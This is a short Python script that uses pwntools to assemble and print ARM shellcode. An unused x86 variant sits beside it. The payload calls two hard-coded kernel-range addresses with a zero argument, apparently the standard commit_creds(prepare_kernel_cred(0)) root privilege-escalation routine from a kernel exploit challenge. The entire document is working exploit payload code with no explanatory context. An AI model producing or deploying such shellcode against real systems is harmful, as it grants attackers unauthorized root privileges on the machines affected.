from pwn import *

x86 = '''
xor eax,eax
push eax
mov ebx, 0x8003f924
call ebx
pop ebx

push eax
mov ebx, 0x8003f55c
add ebx, 0x10
call ebx
pop ebx
ret
'''

arm = '''
nop

push {r0,lr}

mov r0, #0
ldr r2, =0x8003f924
blx r2

ldr r2, =0x8003f56c
blx r2

pop {r0,pc}
'''

shellcode = asm(arm, arch='armv7l')

print(shellcode)
print(len(shellcode))

print(disasm(shellcode, arch='arm'))
